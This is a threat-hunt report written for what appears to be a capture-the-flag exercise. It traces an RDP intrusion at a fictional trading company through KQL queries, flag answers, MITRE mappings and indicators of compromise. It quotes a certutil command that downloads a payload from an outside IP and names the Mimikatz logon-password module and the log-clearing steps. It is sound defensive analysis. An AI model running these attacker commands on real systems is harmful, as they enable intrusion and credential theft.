# Threat Hunt Report: Azuki Series - Pt 1: Port of Entry

**Date of Report:** 2026-03-30

**Analyst:** Madelynn Charron

---

## Executive Summary
Azuki Import/Export experienced a targeted compromise resulting in the theft of sensitive supplier contracts and pricing data. The attacker gained initial access through a successful Remote Desktop Protocol (RDP) login using compromised credentials associated with the *kenji.sato* account.

Following initial access, the attacker established persistence, disabled security controls, and staged malware within a hidden directory. Credential dumping tools were used to escalate access, enabling lateral movement to additional systems. Sensitive data was collected, compressed, and exfiltrated via a Discord webhook. The attacker maintained command-and-control communication and attempted to evade detection by clearing event logs and creating a backdoor administrative account.

---

## Background

### **Situation**

Azuki Import/Export Trading Co. recently lost a six-year shipping contract after a competitor underbid them by exactly 3%. Shortly after, sensitive supplier contracts and pricing data were discovered on underground forums.

The precision of the underbid, combined with the data leak, strongly suggests a targeted compromise resulting in **intellectual property theft and data exfiltration**.

### **Company Overview**

- **Name:** Azuki Import/Export Trading Co.
- **Size:** 23 employees
- **Industry:** Shipping & logistics
- **Region:** Japan / Southeast Asia

### **Compromised System**

- **Hostname:** `AZUKI-SL`
- **Role:** IT Administrator Workstation
- **Significance:** High-value target with elevated privileges and access to sensitive business data

---

## Investigation Overview

### **Available Evidence**

- Microsoft Defender for Endpoint (MDE) telemetry, including:
    - Process events
    - Network activity
    - File activity
    - Registry modifications

### Tools & Environment

- Microsoft Defender for Endpoint (MDE)
- Kusto Query Language (KQL)
- Windows OS telemetry

### **Investigation Objectives**

The threat hunt aims to answer the following key questions:

- What was the **initial access vector**?
- Which **user account(s)** were compromised?
- What **data was accessed or stolen**?
- How was data **exfiltrated**?
- Did the attacker establish **persistence** within the environment?
- Is there evidence of **lateral movement** to other systems?

### **Hunt Scope & Initial Query**

The investigation focuses on activity originating from the compromised administrative workstation within the identified timeframe.
This query establishes a baseline of process activity to identify suspicious behavior, attacker tooling, and execution patterns throughout the intrusion lifecycle.

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
```

---

## Attack Path Summary

- Initial access gained via exposed RDP using compromised credentials (*kenji.sato*)
- PowerShell used to download malicious script (`wupdate.ps1`)
- Defender protections disabled via registry modifications
- Malware staged in hidden directory (`C:\ProgramData\WindowsCache`)
- Payload downloaded using `certutil.exe`
- Persistence established via scheduled task and backdoor account
- Credentials dumped using renamed Mimikatz (`mm.exe`)
- Data collected and archived (`export-data.zip`)
- Data exfiltrated via Discord webhook
- Logs cleared to evade detection

---

## Investigation Timeline

| Time (UTC) | Event | Details |
| --- | --- | --- |
| 2025-11-19 00:57:18 | Initial Access (RDP) | Successful Remote Desktop login from external IP **88.97.178.12** using compromised account *kenji.sato* |
| 2025-11-19 18:49:27 | Defense Evasion | Windows Defender exclusions added for file extensions (.ps1, .exe, .bat) and Temp directory |
| 2025-11-19 18:49:48 | Execution | PowerShell used with `ExecutionPolicy Bypass` to download `wupdate.ps1` from attacker server |
| 2025-11-19 19:04:01 | Discovery | `arp.exe -a` executed to enumerate internal network devices |
| 2025-11-19 19:05:33 | Defense Evasion | Hidden staging directory `C:\ProgramData\WindowsCache` created using `attrib` |
| 2025-11-19 19:06:58 | Payload Delivery | `certutil.exe` used to download malicious `svchost.exe` from **78.141.196.6** |
| 2025-11-19 19:07:47 | Persistence | Scheduled task **"Windows Update Check"** created to execute malware daily as SYSTEM |
| 2025-11-19 19:08:26 | Credential Access | Renamed Mimikatz (`mm.exe`) executed with `sekurlsa::logonpasswords` |
| 2025-11-19 19:08:58 | Collection | Sensitive data compressed into `export-data.zip` in staging directory |
| 2025-11-19 19:09:21 | Exfiltration | Data exfiltrated via `curl.exe` to Discord webhook |
| 2025-11-19 19:09:48 | Persistence (Alt Access) | New admin account **support** created and added to Administrators group |
| 2025-11-19 19:10:42 | Lateral Movement | RDP connection initiated to internal host **10.1.0.188** using `mstsc.exe` |
| 2025-11-19 19:11:04 | Command & Control | Compromised host communicates with C2 server **78.141.196.6** over port 443 |
| 2025-11-19 19:11:39 | Anti-Forensics | Windows event logs cleared using `wevtutil`, starting with Security log |

---

## Flag By Flag Analysis (1-20)

## 🚩 Flag 1: INITIAL ACCESS - Remote Access Source

**Objective:** Remote Desktop Protocol connections leave network traces that identify the source of unauthorized access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.

**Question:** Identify the source IP address of the Remote Desktop Protocol connection?

**Flag Value:** `88.97.178.12`

**Date / Time Detected:** 2025-11-19T00:57:18.3409813Z (12:57:18 AM)

**Query Used:**

```kql
DeviceLogonEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki"
| where LogonType == "RemoteInteractive"
| where ActionType == "LogonSuccess"
| where RemoteIP != ""
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemoteIPType, LogonType
| sort by Timestamp asc
```

**Evidence:**

<img width="1154" height="189" alt="image" src="https://github.com/user-attachments/assets/53cd2725-61cd-4ff5-8ab3-1e578f9427f2" />

**Key Observations:**

- Successful **RemoteInteractive (RDP)** logon observed
- Source IP: **`88.97.178.12`** (public IP)
- Authentication succeeded on multiple Azuki devices using kenji.sato account
- Activity occurred outside normal business context (early hours)
- External IP indicates access originated from outside corporate network

**Analysis:**

The Remote Desktop logon from a public IP address indicates that the attacker gained initial access via exposed or accessible RDP services. The use of valid credentials suggests either credential theft or brute force authentication. Since the connection originated externally and successfully authenticated, this confirms a compromised account was leveraged for initial access.

**MITRE ATT&CK Mapping:**
| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0001 | Initial Access |
| Technique | T1078 | Valid Accounts |


## 🚩 Flag 2: INITIAL ACCESS - Compromised User Account

**Objective:** Identifying which credentials were compromised determines the scope of unauthorized access and guides remediation efforts including password resets and privilege reviews.

**Question:** Identify the user account that was compromised for initial access?

**Flag Value:** `kenji.sato`

**Date / Time Detected:** 2025-11-19T00:57:18.3409813Z (12:57:18 AM)

**Key Observations:**

- Account `kenji.sato` used during the suspicious RDP session
- Same timestamp as initial access event
- Account successfully authenticated from external IP
- Indicates legitimate credentials were used

**Analysis:**

The attacker leveraged the `kenji.sato` account to gain access via RDP. This account becomes the initial foothold for all subsequent attacker activity.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0001 | Initial Access |
| Technique | T1078 | Valid Accounts |


## 🚩 Flag 3: DISCOVERY - Network Reconnaissance

**Objective:** Attackers enumerate network topology to identify lateral movement opportunities and high-value targets. This reconnaissance activity is a key indicator of advanced persistent threats.

**Question:** Identify the command and argument used to enumerate network neighbor's?

**Flag Value:** `"ARP.EXE" -a`

**Date / Time Detected:** 2025-11-19T19:04:01.773778Z (7:04:01 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl" 
| where ProcessCommandLine contains "arp"
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionIP
| sort by TimeGenerated desc
```

**Evidence:**

<img width="2107" height="63" alt="image" src="https://github.com/user-attachments/assets/2db79faa-5bf6-4815-8828-f6075bf0be24" />

**Key Observations:**

- Attacker used:`arp.exe -a`
- Command run from compromised host
- Enumerates local network neighbors (ARP table)
- Indicates attacker is mapping internal network

**Analysis:**
The use of `arp.exe -a` shows the attacker began **internal reconnaissance** after gaining access. This command allows the attacker to identify other devices on the network, which is a critical step for **lateral movement planning**.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0007 | Discovery |
| Technique | T1046 | Network Service Discovery |
| Technique | T1016 | System Network Configuration Discovery |


## 🚩Flag 4: DEFENCE EVASION - Malware Staging Directory

**Objective:** Attackers establish staging locations to organize tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.

**Question:** Identify the PRIMARY staging directory where malware was stored?

**Flag Value:** `C:\ProgramData\WindowsCache`

**Date / Time Detected:** 2025-11-19T19:05:33.7665036Z (7:05:33 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where ProcessCommandLine has_any ("mkdir", "New-Item", "attrib")
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:** 

<img width="1889" height="67" alt="image" src="https://github.com/user-attachments/assets/1321bd67-6ad7-4bf8-811c-92a5a2c38ebe" />

**Key Observations:**

- Directory created: `C:\ProgramData\WindowsCache`
- Use of LOLBIN: `attrib` to hide files/folder
- Directory used repeatedly for:
    - Malware storage
    - Tool execution
    - Data staging
- Located in a commonly trusted system path

**Analysis:**

The attacker created a hidden staging directory to store and execute malicious payloads. By using `attrib` to mark files as hidden, this reduced visibility to both user and detection tools.
 Placing this directory under `ProgramData` helps blend malicious activity with legitimate system files, indicating deliberate defense evasion and operational planning.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1564.001 | Hidden Files and Directories |


## 🚩 Flag 5: DEFENCE EVASION - File Extension Exclusions

**Objective:** Attackers add file extension exclusions to Windows Defender to prevent scanning of malicious files. Counting these exclusions reveals the scope of the attacker's defense evasion strategy.

**Question:** How many file extensions were excluded from Windows Defender scanning?

**Flag Value:** 3

**Date / Time Detected:** 2025-11-19T18:49:27.7301011Z (6:49:27 PM)

**Query Used:**

```kql
DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where RegistryKey contains "Exclusions\\Extensions"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RegistryKey, RegistryValueName
| sort by TimeGenerated desc
```

**Evidence:** 

<img width="1759" height="129" alt="image" src="https://github.com/user-attachments/assets/770214d1-1a92-4daf-9bdb-ef064ff719ad" />

**Key Observations:**

- Registry modifications to:
    - `Windows Defender\Exclusions\Extensions`
- Excluded file types:
    - `.ps1`, `.exe`, `.bat`
    - Ignores listed extensions to allow malware with those file types can run freely.

**Analysis:**
The attacker excluded commonly abused file types from Windows Defender scanning. This ensures that malicious scripts, executables, and batch files can execute without detection or interruption.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1562.001 | Impair Defenses: Disable or Modify Tools |

## 🚩 Flag 6: DEFENCE EVASION - Temporary Folder Exclusion

**Objective:** Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.

**Question:** What temporary folder path was excluded from Windows Defender scanning?

**Flag Value:** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`

**Date / Time Detected:** 2025-11-19T18:49:27.6830204Z (6:49:27 PM)

**Query Used:**

```kql
DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where RegistryKey contains "Exclusions\\Paths"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RegistryKey, RegistryValueName
| sort by TimeGenerated desc
```

**Evidence:** 

<img width="1906" height="98" alt="image" src="https://github.com/user-attachments/assets/fdbe5601-5e62-45ef-838c-d9c2a9a4b9a5" />

**Key Observations:**

- Registry path modified:
    - `Windows Defender\Exclusions\Paths`
- Excluded directory:
    - `C:\Users\KENJI~1.SAT\AppData\Local\Temp`
- Temp directory is commonly used for:
    - Payload downloads
    - Script execution

**Analysis:**

By excluding the Temp directory from Defender scanning, the attacker ensured that downloaded payloads (such as scripts and executables) could be executed without detection.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1562.001 | Impair Defenses: Disable or Modify Tools |

## 🚩 Flag 7: DEFENCE EVASION - Download Utility Abuse

**Objective:** Legitimate system utilities are often weaponized to download malware while evading detection. Identifying these techniques helps improve defensive controls.

**Question:** Identify the Windows-native binary the attacker abused to download files?

**Flag Value:** `certutil.exe`

**Date / Time Detected:** 2025-11-19T19:06:58.5778439Z (7:06:58 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where AccountName != "system"
| where ProcessCommandLine has_any ("certuil", "http", "url", "wget", "curl", "C:\\ProgramData\\WindowsCache")
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:**

<img width="2196" height="266" alt="image" src="https://github.com/user-attachments/assets/6dbcac1a-39c0-47bf-8a38-62cb0193554d" />


**Key Observations:**

- Execution of **`certutil.exe`** with URL download parameters
- Command observed:
    - `certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe`
- Payload saved to:
    - `C:\ProgramData\WindowsCache\svchost.exe`
- Activity observed across multiple hosts
- Use of a **legitimate Windows binary (LOLBIN)**

**Analysis:**

The attacker abused `certutil.exe`, a trusted Windows utility, to download a malicious payload from an external server. This technique allows the attacker to bypass traditional security controls by leveraging a legitimate, signed binary.

The downloaded file (`svchost.exe`) is likely disguised to appear legitimate, further aiding in evasion. This demonstrates a **living-off-the-land (LOLBins)** technique commonly used to avoid detection.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1218 | Signed Binary Proxy Execution |

## 🚩 Flag 8: PERSISTENCE - Scheduled Task Name

**Objective:** Scheduled tasks provide reliable persistence across system reboots. The task name often attempts to blend with legitimate Windows maintenance routines.

**Question:** Identify the name of the scheduled task created for persistence?

**Flag Value:** `Windows Update Check`

**Date / Time Detected:** 2025-11-19T19:07:47.030735Z (7:07:47 PM)

**Query Used:**

```kql
DeviceEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where InitiatingProcessCommandLine contains "schtasks.exe"
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:**

<img width="1161" height="65" alt="image" src="https://github.com/user-attachments/assets/6dd4308e-1444-4ce6-8a10-477966c2db63" />


**Key Observations:**

- Scheduled task created:
    - `"Windows Update Check"`
- Created using `schtasks.exe`
- Configured to run daily as **SYSTEM**
- Task name mimics legitimate Windows functionality

**Analysis:**

The attacker established persistence by creating a scheduled task that executes daily under the SYSTEM account. By naming it “Windows Update Check,” the attacker attempts to blend in with legitimate system tasks and avoid suspicion. Running as SYSTEM ensures high privileges.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0003 | Persistence |
| Technique | T1053.005 | Scheduled Task/Job: Scheduled Task |


## 🚩 Flag 9: PERSISTENCE - Scheduled Task Target

**Objective:** The scheduled task action defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.

**Question:** Identify the executable path configured in the scheduled task?

**Flag Value:** `C:\ProgramData\WindowsCache\svchost.exe`

**Date / Time Detected:** 2025-11-19T19:07:47.030735Z (7:07:47 PM)

**Key Observations:**

- Scheduled task executes:
    - `C:\ProgramData\WindowsCache\svchost.exe`
- Payload located in previously identified staging directory
- Ties persistence directly to attacker-controlled malware

**Analysis:**

The scheduled task is configured to execute the malicious payload stored in the staging directory. This ensures the attacker’s code is re-executed regularly, even after system reboots.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0003 | Persistence |
| Technique | T1053.005 | Scheduled Task/Job: Scheduled Task |

## 🚩 Flag 10: COMMAND & CONTROL - C2 Server Address

**Objective:** Command and control infrastructure allows attackers to remotely control compromised systems. Identifying C2 servers enables network blocking and infrastructure tracking.

**Question:**  Identify the IP address of the command and control server?

**Flag Value:** `78.141.196.6`

**Date / Time Detected:** 2025-11-19T19:11:04.1766386Z (7:11:04 PM)

**Query Used:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-19 19:00:00) .. datetime(2025-11-20 00:00:00))
| where DeviceName contains "azuki-sl"
| where ActionType == "ConnectionSuccess"
| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RemoteIP, RemotePort
| sort by TimeGenerated desc

```

**Evidence:**

<img width="1376" height="74" alt="image" src="https://github.com/user-attachments/assets/b8ad31b6-9317-4b6d-a5f3-b7ef4faaf155" />

**Key Observations:**

- Outbound connections to:
    - **78.141.196.6**
- Initiating process located in:
    - `C:\ProgramData\WindowsCache`
- Activity occurs after payload execution
- Connection successful

**Analysis:**

The compromised system initiated outbound communication with a remote server, indicating establishment of a command-and-control (C2) channel. This allows the attacker to issue commands, deploy additional payloads, or exfiltrate data. The timing and originating process confirm that the downloaded malware is actively communicating with attacker infrastructure.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0011 | Command and Control |
| Technique | T1071 | Application Layer Protocol |


## 🚩 Flag 11: COMMAND & CONTROL - C2 Communication Port

**Objective:** C2 communication ports can indicate the framework or protocol used. This information supports network detection rules and threat intelligence correlation.

**Question:** Identify the destination port used for command and control communications?

**Flag Value:** `443`

**Date / Time Detected:** 2025-11-19T19:11:04.1766386Z (7:11:04 PM)

**Key Observations:**

- Communication over port **443**
- Commonly used for HTTPS traffic
- Blends with normal encrypted web traffic

**Analysis:**

The attacker used port 443 to disguise malicious communications as legitimate HTTPS traffic. This makes detection more difficult, as security tools often allow encrypted outbound traffic by default. This indicates an effort to **blend C2 traffic with normal network activity**.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0011 | Command and Control |
| Technique | T1071.001 | Web Protocols |


## 🚩 Flag 12: CREDENTIAL ACCESS - Credential Theft Tool

**Objective:** Credential dumping tools extract authentication secrets from system memory. These tools are typically renamed to avoid signature-based detection.

**Question:** Identify the filename of the credential dumping tool?

**Flag Value:** mm.exe

**Date / Time Detected:** 2025-11-19T19:08:26.2804285Z (7:08:26 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where FileName endswith ".exe"
| where FolderPath contains "C:\\ProgramData\\WindowsCache"
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:**

<img width="1432" height="104" alt="image" src="https://github.com/user-attachments/assets/41ec9e50-0af3-4ef8-8c82-b35dc22c1171" />

**Key Observations:**

- Execution of:
    - `mm.exe`
- Command includes:
    - `sekurlsa::logonpasswords`
- Tool located in staging directory
- Renamed version of **Mimikatz**

**Analysis:**

The attacker used a renamed version of Mimikatz to dump credentials from memory. Renaming the binary helps evade signature-based detection. The use of `sekurlsa::logonpasswords` confirms active credential harvesting, which could enable lateral movement and privilege escalation.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0006 | Credential Access |
| Technique | T1003 | OS Credential Dumping |


## 🚩 Flag 13: CREDENTIAL ACCESS - Memory Extraction Module

**Objective:** Credential dumping tools use specific modules to extract passwords from security subsystems. Documenting the exact technique used aids in detection engineering.

**Question:** Identify the module used to extract logon passwords from memory?

**Flag Value:** `sekurlsa::logonpasswords`

**Date / Time Detected:** 2025-11-19T19:08:26.2804285Z (7:08:26 PM)

**Key Observations:**

- Module used:
    - `sekurlsa::logonpasswords`
- Extracts credentials from LSASS memory
- Requires elevated privileges

**Analysis:**

The attacker leveraged a specific Mimikatz module to extract plaintext credentials from system memory. This technique is highly effective and commonly used in post-exploitation phases. This confirms that the attacker had sufficient privileges to access sensitive authentication data.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0006 | Credential Access |
| Technique | T1003.001 | LSASS Memory |


## 🚩 Flag 14: COLLECTION - Data Staging Archive

**Objective:** Attackers compress stolen data for efficient exfiltration. The archive filename often includes dates or descriptive names for the attacker's organization.

**Question:** Identify the compressed archive filename used for data exfiltration?

**Flag Value:** `export-data.zip`

**Date / Time Detected:** 2025-11-19T19:08:58.0244963Z (7:08:58 PM)

**Query Used:**

```kql
DeviceFileEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where FolderPath contains "C:\\ProgramData\\WindowsCache"
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath
| sort by TimeGenerated desc
```

**Evidence:**

<img width="1090" height="150" alt="image" src="https://github.com/user-attachments/assets/de69e761-6caa-4fcf-9ea6-f4869fd55292" />

**Key Observations:**

- Archive created:
    - `export-data.zip`
- Located in staging directory
- Indicates preparation for data exfiltration

**Analysis:**

The attacker consolidated collected data into a compressed archive, likely to streamline exfiltration. This step indicates the transition from internal activity to data theft.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0009 | Collection |
| Technique | T1560 | Archive Collected Data |


## 🚩 Flag 15: EXFILTRATION - Exfiltration Channel

**Objective:** Cloud services with upload capabilities are frequently abused for data theft. Identifying the service helps with incident scope determination and potential data recovery.

**Question:** Identify the cloud service used to exfiltrate stolen data?

**Flag Value:** `Discord`

**Date / Time Detected:** 2025-11-19T19:09:21.4234133Z (7:09:21 PM)

**Query Used:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-19 19:00:00) .. datetime(2025-11-20 00:00:00))
| where DeviceName == "azuki-sl"
| where InitiatingProcessCommandLine contains "C:\\ProgramData\\WindowsCache"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:**

<img width="1775" height="151" alt="image" src="https://github.com/user-attachments/assets/f75fc064-20e6-4198-a932-ddc1affbe811" />

**Key Observations:**

- Use of:
    - `curl.exe`
- Data uploaded to:
    - Discord webhook
- File exfiltrated:
    - `export-data.zip`
- External cloud service used

**Analysis:**

The attacker exfiltrated data using a Discord webhook, leveraging a legitimate cloud service to bypass traditional network controls. This technique is increasingly common due to the trusted nature of such platforms. Using `curl.exe` further demonstrates living-off-the-land techniques.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0010 | Exfiltration |
| Technique | T1567 | Exfiltration Over Web Service |


## 🚩 Flag 16: ANTI-FORENSICS - Log Tampering

**Objective:** Clearing event logs destroys forensic evidence and impedes investigation efforts. The order of log clearing can indicate attacker priorities and sophistication.

**Question:** Identify the first Windows event log cleared by the attacker?

**Flag Value:** `Security`

**Date / Time Detected:** 2025-11-19T19:11:39.0934399Z (7:11:39 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| where ProcessCommandLine contains "wevtutil"
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:**

<img width="1227" height="135" alt="image" src="https://github.com/user-attachments/assets/e8422532-cc80-4c39-a01c-e3e7f966d628" />


**Key Observations:**

- Use of:
    - `wevtutil`
- First log cleared:
    - **Security**
- Indicates attempt to remove evidence of activity

**Analysis:**

The attacker cleared Windows event logs to hinder forensic investigation. Targeting the Security log first suggests an attempt to remove authentication and access records.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1070.001 | Clear Windows Event Logs |


## 🚩 Flag 17: IMPACT - Persistence Account

**Objective:** Hidden administrator accounts provide alternative access for future operations. These accounts are often configured to avoid appearing in normal user interfaces.

**Question:** Identify the backdoor account username created by the attacker?

**Flag Value:** `support`

**Date / Time Detected:** 2025-11-19T19:09:48.8977132Z (7:09:48 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| where ProcessCommandLine contains "add"
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:**

<img width="1346" height="155" alt="image" src="https://github.com/user-attachments/assets/b4c92733-dbbc-445a-8a09-accc00c617bd" />


**Key Observations:**

- New account created:
    - `support`
- Added to:
    - Administrators group
- Commands executed via `net.exe`

**Analysis:**

The attacker created a new administrative account to maintain long-term access to the environment. This provides an alternative access method even if the original compromised account is remediated. This is a strong indicator of **persistent unauthorized access and environment control**.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0003 | Persistence |
| Technique | T1136 | Create Account |


## 🚩 Flag 18: EXECUTION - Malicious Script

**Objective:** Attackers often use scripting languages to automate their attack chain. Identifying the initial attack script reveals the entry point and automation method used in the compromise.

**Question:** Identify the PowerShell script file used to automate the attack chain?

**Flag Value:** `wupdate.ps1`

**Date / Time Detected:** 2025-11-19T18:49:48.7079818Z (6:49:48 PM)

**Query Used:**

```kql
DeviceFileEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountDomain == "azuki-sl"
| where FolderPath contains "temp"
| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:**

<img width="2100" height="423" alt="image" src="https://github.com/user-attachments/assets/bf352a83-2c89-46bf-b195-ae4d56faa2db" />


**Key Observations:**

- PowerShell used with:
    - `ExecutionPolicy Bypass`
- Script downloaded:
    - `wupdate.ps1`
- Source:
    - `http://78.141.196.6:8080`
- Saved to Temp directory

**Analysis:**

The attacker executed a PowerShell script with execution policy bypass to avoid security restrictions. The script was downloaded from the attacker-controlled server, indicating it likely orchestrated multiple stages of the attack. This represents the **initial automation mechanism** used post-access.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0002 | Execution |
| Technique | T1059.001 | PowerShell |


## 🚩 Flag 19: LATERAL MOVEMENT - Secondary Target

**Objective:** Lateral movement targets are selected based on their access to sensitive data or network privileges. Identifying these targets reveals attacker objectives.

**Question:** What IP address was targeted for lateral movement?

**Flag Value:** `10.1.0.188`

**Date / Time Detected:** 2025-11-19T19:10:42.057693Z (7:10:42 PM)

**Query Used:**

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountDomain == "azuki-sl"
| where InitiatingProcessFileName has_any ("mstsc", "cmd")
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, RemoteIP
| sort by TimeGenerated desc
```

**Evidence:**

<img width="1310" height="102" alt="image" src="https://github.com/user-attachments/assets/2d1d3b87-afba-483e-afc8-08fbb1b4b9c4" />

**Key Observations:**

- Use of:
    - `mstsc.exe`
- Connection to:
    - `10.1.0.188`
- Indicates internal remote access attempt

**Analysis:**

The attacker attempted lateral movement using Remote Desktop to access another internal system. This indicates expansion beyond the initially compromised host.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0008 | Lateral Movement |
| Technique | T1021.001 | Remote Desktop Protocol |


## 🚩 Flag 20: LATERAL MOVEMENT - Remote Access Tool

**Objective:** Built-in remote access tools are preferred for lateral movement as they blend with legitimate administrative activity. This technique is harder to detect than custom tools.

**Question:** Identify the remote access tool used for lateral movement?

**Flag Value:** `mstsc.exe`

**Date / Time Detected:** 2025-11-19T19:10:42.057693Z (7:10:42 PM)

**Key Observations:**

- Tool used:
    - `mstsc.exe`
- Native Windows RDP client
- Common administrative utility

**Analysis:**

The attacker used the built-in Remote Desktop client to move laterally within the network. This technique blends with legitimate administrative activity, making detection more difficult.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0008 | Lateral Movement |
| Technique | T1021.001 | Remote Desktop Protocol |

---

## Indicators of Compromise

| Category | Indicator | Description |
| --- | --- | --- |
| Attacker IP | 88.97.178.12 | External public IP used to establish initial unauthorized RDP access to the AZUKI-SL workstation |
| C2 Server | 78.141.196.6 | Command-and-control server used to host payloads and maintain communication with compromised system |
| Malicious Files | svchost.exe | Malicious payload downloaded via certutil and stored in hidden staging directory (`C:\ProgramData\WindowsCache`) |
| Malicious Files | mm.exe | Renamed credential dumping tool (Mimikatz) used to extract credentials from memory |
| Malicious Files | wupdate.ps1 | PowerShell script used to automate attack chain, downloaded from attacker infrastructure |
| Malicious Files | export-data.zip | Archive containing collected sensitive data prepared for exfiltration |
| Accounts | kenji.sato | Compromised legitimate user account used for initial access via RDP |
| Accounts | support | Unauthorized administrative account created by attacker for persistence |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
| --- | --- | --- | --- |
| Initial Access | Valid Accounts / Remote Desktop Protocol | T1078 / T1021.001 | Successful RDP logon from external IP **88.97.178.12** using compromised account *kenji.sato* |
| Execution | PowerShell | T1059.001 | PowerShell executed with `ExecutionPolicy Bypass` to download and run `wupdate.ps1` |
| Persistence | Scheduled Task | T1053.005 | Creation of scheduled task **"Windows Update Check"** executing `svchost.exe` from staging directory |
